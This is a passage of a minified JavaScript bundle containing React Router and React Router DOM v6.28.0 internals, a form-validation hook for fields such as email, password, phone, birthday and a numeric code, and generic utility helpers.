        await Bf(s, i.signal, !0).then(c => {
            c && (t[a] = c)
        }
        ))
    }
}
async function Bf(e, t, n) {
    if (n === void 0 && (n = !1),
    !await e.deferredData.resolveData(t)) {
        if (n)
            try {
                return {
                    type: et.data,
                    data: e.deferredData.unwrappedData
                }
            } catch (a) {
                return {
                    type: et.error,
                    error: a
                }
            }
        return {
            type: et.data,
            data: e.deferredData.data
        }
    }
}
function $f(e) {
    return new URLSearchParams(e).getAll("index").some(t => t === "")
}
function Po(e, t) {
    let n = typeof t == "string" ? Ir(t).search : t.search;
    if (e[e.length - 1].route.index && $f(n || ""))
        return e[e.length - 1];
    let r = rg(e);
    return r[r.length - 1]
}
function Dp(e) {
    let {formMethod: t, formAction: n, formEncType: r, text: a, formData: o, json: i} = e;
    if (!(!t || !n || !r)) {
        if (a != null)
            return {
                formMethod: t,
                formAction: n,
                formEncType: r,
                formData: void 0,
                json: void 0,
                text: a
            };
        if (o != null)
            return {
                formMethod: t,
                formAction: n,
                formEncType: r,
                formData: o,
                json: void 0,
                text: void 0
            };
        if (i !== void 0)
            return {
                formMethod: t,
                formAction: n,
                formEncType: r,
                formData: void 0,
                json: i,
                text: void 0
            }
    }
}
function lu(e, t) {
    return t ? {
        state: "loading",
        location: e,
        formMethod: t.formMethod,
        formAction: t.formAction,
        formEncType: t.formEncType,
        formData: t.formData,
        json: t.json,
        text: t.text
    } : {
        state: "loading",
        location: e,
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0
    }
}
function ax(e, t) {
    return {
        state: "submitting",
        location: e,
        formMethod: t.formMethod,
        formAction: t.formAction,
        formEncType: t.formEncType,
        formData: t.formData,
        json: t.json,
        text: t.text
    }
}
function bo(e, t) {
    return e ? {
        state: "loading",
        formMethod: e.formMethod,
        formAction: e.formAction,
        formEncType: e.formEncType,
        formData: e.formData,
        json: e.json,
        text: e.text,
        data: t
    } : {
        state: "loading",
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0,
        data: t
    }
}
function ox(e, t) {
    return {
        state: "submitting",
        formMethod: e.formMethod,
        formAction: e.formAction,
        formEncType: e.formEncType,
        formData: e.formData,
        json: e.json,
        text: e.text,
        data: t ? t.data : void 0
    }
}
function cr(e) {
    return {
        state: "idle",
        formMethod: void 0,
        formAction: void 0,
        formEncType: void 0,
        formData: void 0,
        json: void 0,
        text: void 0,
        data: e
    }
}
function ix(e, t) {
    try {
        let n = e.sessionStorage.getItem(og);
        if (n) {
            let r = JSON.parse(n);
            for (let[a,o] of Object.entries(r || {}))
                o && Array.isArray(o) && t.set(a, new Set(o || []))
        }
    } catch {}
}
function sx(e, t) {
    if (t.size > 0) {
        let n = {};
        for (let[r,a] of t)
            n[r] = [...a];
        try {
            e.sessionStorage.setItem(og, JSON.stringify(n))
        } catch (r) {
            Qa(!1, "Failed to save applied view transitions in sessionStorage (" + r + ").")
        }
    }
}
/**
 * React Router v6.28.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function Vs() {
    return Vs = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }
    ,
    Vs.apply(this, arguments)
}
const bl = j.createContext(null)
  , cg = j.createContext(null)
  , Mr = j.createContext(null)
  , Hf = j.createContext(null)
  , tr = j.createContext({
    outlet: null,
    matches: [],
    isDataRoute: !1
})
  , fg = j.createContext(null);
function lx(e, t) {
    let {relative: n} = t === void 0 ? {} : t;
    no() || Fe(!1);
    let {basename: r, navigator: a} = j.useContext(Mr)
      , {hash: o, pathname: i, search: s} = hg(e, {
        relative: n
    })
      , u = i;
    return r !== "/" && (u = i === "/" ? r : Gn([r, i])),
    a.createHref({
        pathname: u,
        search: s,
        hash: o
    })
}
function no() {
    return j.useContext(Hf) != null
}
function ha() {
    return no() || Fe(!1),
    j.useContext(Hf).location
}
function dg(e) {
    j.useContext(Mr).static || j.useLayoutEffect(e)
}
function Dr() {
    let {isDataRoute: e} = j.useContext(tr);
    return e ? bx() : ux()
}
function ux() {
    no() || Fe(!1);
    let e = j.useContext(bl)
      , {basename: t, future: n, navigator: r} = j.useContext(Mr)
      , {matches: a} = j.useContext(tr)
      , {pathname: o} = ha()
      , i = JSON.stringify(vl(a, n.v7_relativeSplatPath))
      , s = j.useRef(!1);
    return dg( () => {
        s.current = !0
    }
    ),
    j.useCallback(function(c, f) {
        if (f === void 0 && (f = {}),
        !s.current)
            return;
        if (typeof c == "number") {
            r.go(c);
            return
        }
        let d = xl(c, JSON.parse(i), o, f.relative === "path");
        e == null && t !== "/" && (d.pathname = d.pathname === "/" ? t : Gn([t, d.pathname])),
        (f.replace ? r.replace : r.push)(d, f.state, f)
    }, [t, r, i, o, e])
}
const pg = j.createContext(null);
function Vf() {
    return j.useContext(pg)
}
function cx(e) {
    let t = j.useContext(tr).outlet;
    return t && j.createElement(pg.Provider, {
        value: e
    }, t)
}
function hg(e, t) {
    let {relative: n} = t === void 0 ? {} : t
      , {future: r} = j.useContext(Mr)
      , {matches: a} = j.useContext(tr)
      , {pathname: o} = ha()
      , i = JSON.stringify(vl(a, r.v7_relativeSplatPath));
    return j.useMemo( () => xl(e, JSON.parse(i), o, n === "path"), [e, i, o, n])
}
function fx(e, t, n, r) {
    no() || Fe(!1);
    let {navigator: a} = j.useContext(Mr)
      , {matches: o} = j.useContext(tr)
      , i = o[o.length - 1]
      , s = i ? i.params : {};
    i && i.pathname;
    let u = i ? i.pathnameBase : "/";
    i && i.route;
    let c = ha(), f;
    f = c;
    let d = f.pathname || "/"
      , h = d;
    if (u !== "/") {
        let S = u.replace(/^\//, "").split("/");
        h = "/" + d.replace(/^\//, "").split("/").slice(S.length).join("/")
    }
    let N = $r(e, {
        pathname: h
    });
    return gx(N && N.map(S => Object.assign({}, S, {
        params: Object.assign({}, s, S.params),
        pathname: Gn([u, a.encodeLocation ? a.encodeLocation(S.pathname).pathname : S.pathname]),
        pathnameBase: S.pathnameBase === "/" ? u : Gn([u, a.encodeLocation ? a.encodeLocation(S.pathnameBase).pathname : S.pathnameBase])
    })), o, n, r)
}
function dx() {
    let e = wx()
      , t = wl(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e)
      , n = e instanceof Error ? e.stack : null
      , a = {
        padding: "0.5rem",
        backgroundColor: "rgba(200,200,200, 0.5)"
    };
    return j.createElement(j.Fragment, null, j.createElement("h2", null, "Unexpected Application Error!"), j.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, t), n ? j.createElement("pre", {
        style: a
    }, n) : null, null)
}
const px = j.createElement(dx, null);
class hx extends j.Component {
    constructor(t) {
        super(t),
        this.state = {
            location: t.location,
            revalidation: t.revalidation,
            error: t.error
        }
    }
    static getDerivedStateFromError(t) {
        return {
            error: t
        }
    }
    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || n.revalidation !== "idle" && t.revalidation === "idle" ? {
            error: t.error,
            location: t.location,
            revalidation: t.revalidation
        } : {
            error: t.error !== void 0 ? t.error : n.error,
            location: n.location,
            revalidation: t.revalidation || n.revalidation
        }
    }
    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n)
    }
    render() {
        return this.state.error !== void 0 ? j.createElement(tr.Provider, {
            value: this.props.routeContext
        }, j.createElement(fg.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}
function mx(e) {
    let {routeContext: t, match: n, children: r} = e
      , a = j.useContext(bl);
    return a && a.static && a.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (a.staticContext._deepestRenderedBoundaryId = n.route.id),
    j.createElement(tr.Provider, {
        value: t
    }, r)
}
function gx(e, t, n, r) {
    var a;
    if (t === void 0 && (t = []),
    n === void 0 && (n = null),
    r === void 0 && (r = null),
    e == null) {
        var o;
        if (!n)
            return null;
        if (n.errors)
            e = n.matches;
        else if ((o = r) != null && o.v7_partialHydration && t.length === 0 && !n.initialized && n.matches.length > 0)
            e = n.matches;
        else
            return null
    }
    let i = e
      , s = (a = n) == null ? void 0 : a.errors;
    if (s != null) {
        let f = i.findIndex(d => d.route.id && (s == null ? void 0 : s[d.route.id]) !== void 0);
        f >= 0 || Fe(!1),
        i = i.slice(0, Math.min(i.length, f + 1))
    }
    let u = !1
      , c = -1;
    if (n && r && r.v7_partialHydration)
        for (let f = 0; f < i.length; f++) {
            let d = i[f];
            if ((d.route.HydrateFallback || d.route.hydrateFallbackElement) && (c = f),
            d.route.id) {
                let {loaderData: h, errors: N} = n
                  , y = d.route.loader && h[d.route.id] === void 0 && (!N || N[d.route.id] === void 0);
                if (d.route.lazy || y) {
                    u = !0,
                    c >= 0 ? i = i.slice(0, c + 1) : i = [i[0]];
                    break
                }
            }
        }
    return i.reduceRight( (f, d, h) => {
        let N, y = !1, S = null, x = null;
        n && (N = s && d.route.id ? s[d.route.id] : void 0,
        S = d.route.errorElement || px,
        u && (c < 0 && h === 0 ? (Sx("route-fallback"),
        y = !0,
        x = null) : c === h && (y = !0,
        x = d.route.hydrateFallbackElement || null)));
        let g = t.concat(i.slice(0, h + 1))
          , p = () => {
            let m;
            return N ? m = S : y ? m = x : d.route.Component ? m = j.createElement(d.route.Component, null) : d.route.element ? m = d.route.element : m = f,
            j.createElement(mx, {
                match: d,
                routeContext: {
                    outlet: f,
                    matches: g,
                    isDataRoute: n != null
                },
                children: m
            })
        }
        ;
        return n && (d.route.ErrorBoundary || d.route.errorElement || h === 0) ? j.createElement(hx, {
            location: n.location,
            revalidation: n.revalidation,
            component: S,
            error: N,
            children: p(),
            routeContext: {
                outlet: null,
                matches: g,
                isDataRoute: !0
            }
        }) : p()
    }
    , null)
}
var mg = function(e) {
    return e.UseBlocker = "useBlocker",
    e.UseRevalidator = "useRevalidator",
    e.UseNavigateStable = "useNavigate",
    e
}(mg || {})
  , gg = function(e) {
    return e.UseBlocker = "useBlocker",
    e.UseLoaderData = "useLoaderData",
    e.UseActionData = "useActionData",
    e.UseRouteError = "useRouteError",
    e.UseNavigation = "useNavigation",
    e.UseRouteLoaderData = "useRouteLoaderData",
    e.UseMatches = "useMatches",
    e.UseRevalidator = "useRevalidator",
    e.UseNavigateStable = "useNavigate",
    e.UseRouteId = "useRouteId",
    e
}(gg || {});
function yx(e) {
    let t = j.useContext(bl);
    return t || Fe(!1),
    t
}
function vx(e) {
    let t = j.useContext(cg);
    return t || Fe(!1),
    t
}
function xx(e) {
    let t = j.useContext(tr);
    return t || Fe(!1),
    t
}
function yg(e) {
    let t = xx()
      , n = t.matches[t.matches.length - 1];
    return n.route.id || Fe(!1),
    n.route.id
}
function wx() {
    var e;
    let t = j.useContext(fg)
      , n = vx(gg.UseRouteError)
      , r = yg();
    return t !== void 0 ? t : (e = n.errors) == null ? void 0 : e[r]
}
function bx() {
    let {router: e} = yx(mg.UseNavigateStable)
      , t = yg()
      , n = j.useRef(!1);
    return dg( () => {
        n.current = !0
    }
    ),
    j.useCallback(function(a, o) {
        o === void 0 && (o = {}),
        n.current && (typeof a == "number" ? e.navigate(a) : e.navigate(a, Vs({
            fromRouteId: t
        }, o)))
    }, [e, t])
}
const zp = {};
function Sx(e, t, n) {
    zp[e] || (zp[e] = !0)
}
const Fp = {};
function Nx(e, t) {
    Fp[t] || (Fp[t] = !0,
    console.warn(t))
}
const wa = (e, t, n) => Nx(e, "⚠️ React Router Future Flag Warning: " + t + ". " + ("You can use the `" + e + "` future flag to opt-in early. ") + ("For more information, see " + n + "."));
function Cx(e, t) {
    e != null && e.v7_startTransition || wa("v7_startTransition", "React Router will begin wrapping state updates in `React.startTransition` in v7", "https://reactrouter.com/v6/upgrading/future#v7_starttransition"),
    !(e != null && e.v7_relativeSplatPath) && (!t || !t.v7_relativeSplatPath) && wa("v7_relativeSplatPath", "Relative route resolution within Splat routes is changing in v7", "https://reactrouter.com/v6/upgrading/future#v7_relativesplatpath"),
    t && (t.v7_fetcherPersist || wa("v7_fetcherPersist", "The persistence behavior of fetchers is changing in v7", "https://reactrouter.com/v6/upgrading/future#v7_fetcherpersist"),
    t.v7_normalizeFormMethod || wa("v7_normalizeFormMethod", "Casing of `formMethod` fields is being normalized to uppercase in v7", "https://reactrouter.com/v6/upgrading/future#v7_normalizeformmethod"),
    t.v7_partialHydration || wa("v7_partialHydration", "`RouterProvider` hydration behavior is changing in v7", "https://reactrouter.com/v6/upgrading/future#v7_partialhydration"),
    t.v7_skipActionErrorRevalidation || wa("v7_skipActionErrorRevalidation", "The revalidation behavior after 4xx/5xx `action` responses is changing in v7", "https://reactrouter.com/v6/upgrading/future#v7_skipactionerrorrevalidation"))
}
function kx(e) {
    let {to: t, replace: n, state: r, relative: a} = e;
    no() || Fe(!1);
    let {future: o, static: i} = j.useContext(Mr)
      , {matches: s} = j.useContext(tr)
      , {pathname: u} = ha()
      , c = Dr()
      , f = xl(t, vl(s, o.v7_relativeSplatPath), u, a === "path")
      , d = JSON.stringify(f);
    return j.useEffect( () => c(JSON.parse(d), {
        replace: n,
        state: r,
        relative: a
    }), [c, d, a, n, r]),
    null
}
function Wf(e) {
    return cx(e.context)
}
function Ot(e) {
    Fe(!1)
}
function jx(e) {
    let {basename: t="/", children: n=null, location: r, navigationType: a=kt.Pop, navigator: o, static: i=!1, future: s} = e;
    no() && Fe(!1);
    let u = t.replace(/^\/*/, "/")
      , c = j.useMemo( () => ({
        basename: u,
        navigator: o,
        static: i,
        future: Vs({
            v7_relativeSplatPath: !1
        }, s)
    }), [u, s, o, i]);
    typeof r == "string" && (r = Ir(r));
    let {pathname: f="/", search: d="", hash: h="", state: N=null, key: y="default"} = r
      , S = j.useMemo( () => {
        let x = to(f, u);
        return x == null ? null : {
            location: {
                pathname: x,
                search: d,
                hash: h,
                state: N,
                key: y
            },
            navigationType: a
        }
    }
    , [u, f, d, h, N, y, a]);
    return S == null ? null : j.createElement(Mr.Provider, {
        value: c
    }, j.createElement(Hf.Provider, {
        children: n,
        value: S
    }))
}
new Promise( () => {}
);
function yc(e, t) {
    t === void 0 && (t = []);
    let n = [];
    return j.Children.forEach(e, (r, a) => {
        if (!j.isValidElement(r))
            return;
        let o = [...t, a];
        if (r.type === j.Fragment) {
            n.push.apply(n, yc(r.props.children, o));
            return
        }
        r.type !== Ot && Fe(!1),
        !r.props.index || !r.props.children || Fe(!1);
        let i = {
            id: r.props.id || o.join("-"),
            caseSensitive: r.props.caseSensitive,
            element: r.props.element,
            Component: r.props.Component,
            index: r.props.index,
            path: r.props.path,
            loader: r.props.loader,
            action: r.props.action,
            errorElement: r.props.errorElement,
            ErrorBoundary: r.props.ErrorBoundary,
            hasErrorBoundary: r.props.ErrorBoundary != null || r.props.errorElement != null,
            shouldRevalidate: r.props.shouldRevalidate,
            handle: r.props.handle,
            lazy: r.props.lazy
        };
        r.props.children && (i.children = yc(r.props.children, o)),
        n.push(i)
    }
    ),
    n
}
function Ex(e) {
    let t = {
        hasErrorBoundary: e.ErrorBoundary != null || e.errorElement != null
    };
    return e.Component && Object.assign(t, {
        element: j.createElement(e.Component),
        Component: void 0
    }),
    e.HydrateFallback && Object.assign(t, {
        hydrateFallbackElement: j.createElement(e.HydrateFallback),
        HydrateFallback: void 0
    }),
    e.ErrorBoundary && Object.assign(t, {
        errorElement: j.createElement(e.ErrorBoundary),
        ErrorBoundary: void 0
    }),
    t
}
/**
 * React Router DOM v6.28.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function ui() {
    return ui = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
                Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }
    ,
    ui.apply(this, arguments)
}
function _x(e, t) {
    if (e == null)
        return {};
    var n = {}, r = Object.keys(e), a, o;
    for (o = 0; o < r.length; o++)
        a = r[o],
        !(t.indexOf(a) >= 0) && (n[a] = e[a]);
    return n
}
function Tx(e) {
    return !!(e.metaKey || e.altKey || e.ctrlKey || e.shiftKey)
}
function Px(e, t) {
    return e.button === 0 && (!t || t === "_self") && !Tx(e)
}
const Ox = ["onClick", "relative", "reloadDocument", "replace", "state", "target", "to", "preventScrollReset", "viewTransition"]
  , Rx = "6";
try {
    window.__reactRouterVersion = Rx
} catch {}
function Ax(e, t) {
    return $2({
        basename: void 0,
        future: ui({}, void 0, {
            v7_prependBasename: !0
        }),
        history: d2({
            window: void 0
        }),
        hydrationData: Lx(),
        routes: e,
        mapRouteProperties: Ex,
        dataStrategy: void 0,
        patchRoutesOnNavigation: void 0,
        window: void 0
    }).initialize()
}
function Lx() {
    var e;
    let t = (e = window) == null ? void 0 : e.__staticRouterHydrationData;
    return t && t.errors && (t = ui({}, t, {
        errors: Ix(t.errors)
    })),
    t
}
function Ix(e) {
    if (!e)
        return null;
    let t = Object.entries(e)
      , n = {};
    for (let[r,a] of t)
        if (a && a.__type === "RouteErrorResponse")
            n[r] = new Hs(a.status,a.statusText,a.data,a.internal === !0);
        else if (a && a.__type === "Error") {
            if (a.__subType) {
                let o = window[a.__subType];
                if (typeof o == "function")
                    try {
                        let i = new o(a.message);
                        i.stack = "",
                        n[r] = i
                    } catch {}
            }
            if (n[r] == null) {
                let o = new Error(a.message);
                o.stack = "",
                n[r] = o
            }
        } else
            n[r] = a;
    return n
}
const Mx = j.createContext({
    isTransitioning: !1
})
  , Dx = j.createContext(new Map)
  , zx = "startTransition"
  , Up = Z1[zx]
  , Fx = "flushSync"
  , Bp = f2[Fx];
function Ux(e) {
    Up ? Up(e) : e()
}
function So(e) {
    Bp ? Bp(e) : e()
}
class Bx {
    constructor() {
        this.status = "pending",
        this.promise = new Promise( (t, n) => {
            this.resolve = r => {
                this.status === "pending" && (this.status = "resolved",
                t(r))
            }
            ,
            this.reject = r => {
                this.status === "pending" && (this.status = "rejected",
                n(r))
            }
        }
        )
    }
}
function $x(e) {
    let {fallbackElement: t, router: n, future: r} = e
      , [a,o] = j.useState(n.state)
      , [i,s] = j.useState()
      , [u,c] = j.useState({
        isTransitioning: !1
    })
      , [f,d] = j.useState()
      , [h,N] = j.useState()
      , [y,S] = j.useState()
      , x = j.useRef(new Map)
      , {v7_startTransition: g} = r || {}
      , p = j.useCallback(P => {
        g ? Ux(P) : P()
    }
    , [g])
      , m = j.useCallback( (P, K) => {
        let {deletedFetchers: $, flushSync: Se, viewTransitionOpts: Te} = K;
        $.forEach(H => x.current.delete(H)),
        P.fetchers.forEach( (H, X) => {
            H.data !== void 0 && x.current.set(X, H.data)
        }
        );
        let Ae = n.window == null || n.window.document == null || typeof n.window.document.startViewTransition != "function";
        if (!Te || Ae) {
            Se ? So( () => o(P)) : p( () => o(P));
            return
        }
        if (Se) {
            So( () => {
                h && (f && f.resolve(),
                h.skipTransition()),
                c({
                    isTransitioning: !0,
                    flushSync: !0,
                    currentLocation: Te.currentLocation,
                    nextLocation: Te.nextLocation
                })
            }
            );
            let H = n.window.document.startViewTransition( () => {
                So( () => o(P))
            }
            );
            H.finished.finally( () => {
                So( () => {
                    d(void 0),
                    N(void 0),
                    s(void 0),
                    c({
                        isTransitioning: !1
                    })
                }
                )
            }
            ),
            So( () => N(H));
            return
        }
        h ? (f && f.resolve(),
        h.skipTransition(),
        S({
            state: P,
            currentLocation: Te.currentLocation,
            nextLocation: Te.nextLocation
        })) : (s(P),
        c({
            isTransitioning: !0,
            flushSync: !1,
            currentLocation: Te.currentLocation,
            nextLocation: Te.nextLocation
        }))
    }
    , [n.window, h, f, x, p]);
    j.useLayoutEffect( () => n.subscribe(m), [n, m]),
    j.useEffect( () => {
        u.isTransitioning && !u.flushSync && d(new Bx)
    }
    , [u]),
    j.useEffect( () => {
        if (f && i && n.window) {
            let P = i
              , K = f.promise
              , $ = n.window.document.startViewTransition(async () => {
                p( () => o(P)),
                await K
            }
            );
            $.finished.finally( () => {
                d(void 0),
                N(void 0),
                s(void 0),
                c({
                    isTransitioning: !1
                })
            }
            ),
            N($)
        }
    }
    , [p, i, f, n.window]),
    j.useEffect( () => {
        f && i && a.location.key === i.location.key && f.resolve()
    }
    , [f, h, a.location, i]),
    j.useEffect( () => {
        !u.isTransitioning && y && (s(y.state),
        c({
            isTransitioning: !0,
            flushSync: !1,
            currentLocation: y.currentLocation,
            nextLocation: y.nextLocation
        }),
        S(void 0))
    }
    , [u.isTransitioning, y]),
    j.useEffect( () => {}
    , []);
    let C = j.useMemo( () => ({
        createHref: n.createHref,
        encodeLocation: n.encodeLocation,
        go: P => n.navigate(P),
        push: (P, K, $) => n.navigate(P, {
            state: K,
            preventScrollReset: $ == null ? void 0 : $.preventScrollReset
        }),
        replace: (P, K, $) => n.navigate(P, {
            replace: !0,
            state: K,
            preventScrollReset: $ == null ? void 0 : $.preventScrollReset
        })
    }), [n])
      , k = n.basename || "/"
      , w = j.useMemo( () => ({
        router: n,
        navigator: C,
        static: !1,
        basename: k
    }), [n, C, k])
      , A = j.useMemo( () => ({
        v7_relativeSplatPath: n.future.v7_relativeSplatPath
    }), [n.future.v7_relativeSplatPath]);
    return j.useEffect( () => Cx(r, n.future), [r, n.future]),
    j.createElement(j.Fragment, null, j.createElement(bl.Provider, {
        value: w
    }, j.createElement(cg.Provider, {
        value: a
    }, j.createElement(Dx.Provider, {
        value: x.current
    }, j.createElement(Mx.Provider, {
        value: u
    }, j.createElement(jx, {
        basename: k,
        location: a.location,
        navigationType: a.historyAction,
        navigator: C,
        future: A
    }, a.initialized || n.future.v7_partialHydration ? j.createElement(Hx, {
        routes: n.routes,
        future: n.future,
        state: a
    }) : t))))), null)
}
const Hx = j.memo(Vx);
function Vx(e) {
    let {routes: t, future: n, state: r} = e;
    return fx(t, void 0, r, n)
}
const Wx = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u"
  , Kx = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , $p = j.forwardRef(function(t, n) {
    let {onClick: r, relative: a, reloadDocument: o, replace: i, state: s, target: u, to: c, preventScrollReset: f, viewTransition: d} = t, h = _x(t, Ox), {basename: N} = j.useContext(Mr), y, S = !1;
    if (typeof c == "string" && Kx.test(c) && (y = c,
    Wx))
        try {
            let m = new URL(window.location.href)
              , C = c.startsWith("//") ? new URL(m.protocol + c) : new URL(c)
              , k = to(C.pathname, N);
            C.origin === m.origin && k != null ? c = k + C.search + C.hash : S = !0
        } catch {}
    let x = lx(c, {
        relative: a
    })
      , g = Gx(c, {
        replace: i,
        state: s,
        target: u,
        preventScrollReset: f,
        relative: a,
        viewTransition: d
    });
    function p(m) {
        r && r(m),
        m.defaultPrevented || g(m)
    }
    return j.createElement("a", ui({}, h, {
        href: y || x,
        onClick: S || o ? r : p,
        ref: n,
        target: u
    }))
});
var Hp;
(function(e) {
    e.UseScrollRestoration = "useScrollRestoration",
    e.UseSubmit = "useSubmit",
    e.UseSubmitFetcher = "useSubmitFetcher",
    e.UseFetcher = "useFetcher",
    e.useViewTransitionState = "useViewTransitionState"
}
)(Hp || (Hp = {}));
var Vp;
(function(e) {
    e.UseFetcher = "useFetcher",
    e.UseFetchers = "useFetchers",
    e.UseScrollRestoration = "useScrollRestoration"
}
)(Vp || (Vp = {}));
function Gx(e, t) {
    let {target: n, replace: r, state: a, preventScrollReset: o, relative: i, viewTransition: s} = t === void 0 ? {} : t
      , u = Dr()
      , c = ha()
      , f = hg(e, {
        relative: i
    });
    return j.useCallback(d => {
        if (Px(d, n)) {
            d.preventDefault();
            let h = r !== void 0 ? r : sa(c) === sa(f);
            u(e, {
                replace: h,
                state: a,
                preventScrollReset: o,
                relative: i,
                viewTransition: s
            })
        }
    }
    , [c, u, f, r, a, n, e, o, i, s])
}
const Kf = () => {
    const [e,t] = j.useState({})
      , n = y => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(y)
      , r = y => {
        const S = y.replace(/\D/g, "");
        return S.length < 8 || S.length > 15 ? !1 : /^[\d+\-() ]+$/.test(y)
    }
      , a = y => /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/.test(y)
      , o = y => {
        const S = y.replace(/\D/g, "");
        return S.length >= 6 && S.length <= 8 && /^\d+$/.test(y)
    }
      , i = y => !y.trim() || !n(y) ? "Invalid email" : ""
      , s = y => y.trim() ? "" : "Invalid password"
      , u = y => y.trim() ? "" : "Invalid page name"
      , c = y => y.trim() ? "" : "Invalid name"
      , f = y => !y.trim() || !r(y) ? "Invalid phone number" : ""
      , d = y => !y.trim() || !a(y) ? "Invalid birthday" : ""
      , h = y => !y.trim() || !o(y) ? "Invalid code" : "";
    return {
        errors: e,
        validateInput: (y, S) => {
            let x = "";
            switch (y) {
            case "email":
                x = i(S);
                break;
            case "password":
                x = s(S);
                break;
            case "pageName":
                x = u(S);
                break;
            case "name":
                x = c(S);
                break;
            case "phoneNumber":
                x = f(S);
                break;
            case "birthday":
                x = d(S);
                break;
            case "code":
                x = h(S);
                break
            }
            t(g => ({
                ...g,
                [y]: x
            }))
        }
    }
}
;
function vg(e, t) {
    return function() {
        return e.apply(t, arguments)
    }
}
const {toString: Yx} = Object.prototype
  , {getPrototypeOf: Gf} = Object
  , Sl = (e => t => {
    const n = Yx.call(t);
    return e[n] || (e[n] = n.slice(8, -1).toLowerCase())
}
)(Object.create(null))
  , Pn = e => (e = e.toLowerCase(),
t => Sl(t) === e)
  , Nl = e => t => typeof t === e
  , {isArray: ro} = Array
  , ci = Nl("undefined");
function Qx(e) {
    return e !== null && !ci(e) && e.constructor !== null && !ci(e.constructor) && ln(e.constructor.isBuffer) && e.constructor.isBuffer(e)
}
const xg = Pn("ArrayBuffer");
function Xx(e) {
    let t;
    return typeof ArrayBuffer < "u" && ArrayBuffer.isView ? t = ArrayBuffer.isView(e) : t = e && e.buffer && xg(e.buffer),
    t
}
const qx = Nl("string")
  , ln = Nl("function")
  , wg = Nl("number")
  , Cl = e => e !== null && typeof e == "object"
  , Jx = e => e === !0 || e === !1
  , ps = e => {
    if (Sl(e) !== "object")
        return !1;
    const t = Gf(e);
    return (t === null || t === Object.prototype || Object.getPrototypeOf(t) === null) && !(Symbol.toStringTag in e) && !(Symbol.iterator in e)
}
  , Zx = Pn("Date")
  , ew = Pn("File")
  , tw = Pn("Blob")
  , nw = Pn("FileList")
  , rw = e => Cl(e) && ln(e.pipe)
  , aw = e => {
    let t;
    return e && (typeof FormData == "function" && e instanceof FormData || ln(e.append) && ((t = Sl(e)) === "formdata" || t === "object" && ln(e.toString) && e.toString() === "[object FormData]"))
}
  , ow = Pn("URLSearchParams")
  , [iw,sw,lw,uw] = ["ReadableStream", "Request", "Response", "Headers"].map(Pn)
  , cw = e => e.trim ? e.trim() : e.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
function wi(e, t, {allOwnKeys: n=!1}={}) {
    if (e === null || typeof e > "u")
        return;
    let r, a;
    if (typeof e != "object" && (e = [e]),
    ro(e))
        for (r = 0,
        a = e.length; r < a; r++)
            t.call(null, e[r], r, e);
    else {
        const o = n ? Object.getOwnPropertyNames(e) : Object.keys(e)
          , i = o.length;
        let s;
        for (r = 0; r < i; r++)
            s = o[r],
            t.call(null, e[s], s, e)
    }
}
function bg(e, t) {
    t = t.toLowerCase();
    const n = Object.keys(e);
    let r = n.length, a;
    for (; r-- > 0; )
        if (a = n[r],
        t === a.toLowerCase())
            return a;
    return null
}
const Qr = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : global
  , Sg = e => !ci(e) && e !== Qr;
function vc() {
    const {caseless: e} = Sg(this) && this || {}
      , t = {}
      , n = (r, a) => {
        const o = e && bg(t, a) || a;
        ps(t[o]) && ps(r) ? t[o] = vc(t[o], r) : ps(r) ? t[o] = vc({}, r) : ro(r) ? t[o] = r.slice() : t[o] = r
    }
    ;
    for (let r = 0, a = arguments.length; r < a; r++)
        arguments[r] && wi(arguments[r], n);
    return t
}
const fw = (e, t, n, {allOwnKeys: r}={}) => (wi(t, (a, o) => {
    n && ln(a) ? e[o] = vg(a, n) : e[o] = a
}
, {
    allOwnKeys: r
}),
e)
  , dw = e => (e.charCodeAt(0) === 65279 && (e = e.slice(1)),
e)
  , pw = (e, t, n, r) => {
    e.prototype = Object.create(t.prototype, r),
    e.prototype.constructor = e,
    Object.defineProperty(e, "super", {
        value: t.prototype
    }),
    n && Object.assign(e.prototype, n)
}
  , hw = (e, t, n, r) => {
    let a, o, i;
    const s = {};
    if (t = t || {},
    e == null)
        return t;
    do {
        for (a = Object.getOwnPropertyNames(e),
        o = a.length; o-- > 0; )
            i = a[o],
            (!r || r(i, e, t)) && !s[i] && (t[i] = e[i],
            s[i] = !0);
        e = n !== !1 && Gf(e)
    } while (e && (!n || n(e, t)) && e !== Object.prototype);
    return t
}
  , mw = (e, t, n) => {
    e = String(e),
    (n === void 0 || n > e.length) && (n = e.length),
    n -= t.length;
    const r = e.indexOf(t, n);
    return r !== -1 && r === n
}
  , gw = e => {
    if (!e)
        return null;
    if (ro(e))
        return e;
    let t = e.length;
    if (!wg(t))
        return null;
    const n = new Array(t);
    for (; t-- > 0; )
        n[t] = e[t];
    return n
}
  , yw = (e => t => e && t instanceof e)(typeof Uint8Array < "u" && Gf(Uint8Array))
  , vw = (e, t) => {
    const r = (e && e[Symbol.iterator]).call(e);
    let a;
    for (; (a = r.next()) && !a.done; ) {
        const o = a.value;
        t.call(e, o[0], o[1])
    }
}
